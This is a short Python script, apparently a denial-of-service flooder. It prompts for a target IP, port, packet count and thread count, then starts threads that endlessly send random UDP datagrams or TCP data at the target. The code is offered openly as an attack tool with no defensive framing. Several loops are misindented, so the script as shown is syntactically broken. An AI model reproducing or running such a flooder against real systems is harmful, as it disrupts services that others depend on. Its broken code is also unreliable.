import random
import socket
import threading




ip = str(input(" Please enter the IP address of the host:"))
port = int(input(" Port number:"))
choice = str(input(" UDP yes orno:"))
times = int(input(" How many packets per individual connection:"))
threads = int(input(" How many threads:"))


def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				addr = (str(ip),int(port))
				for x in range(times):
					s.sendto(data,addr)
				print(i +" SENT!!!")
			except:
				print("[!] ERROR")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip,port))
				s.send(data)
				for x in range(times):
					s.send(data)
				print(i +" SENT")
			except:
					s.close()
				print("[*] ERROR")


for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
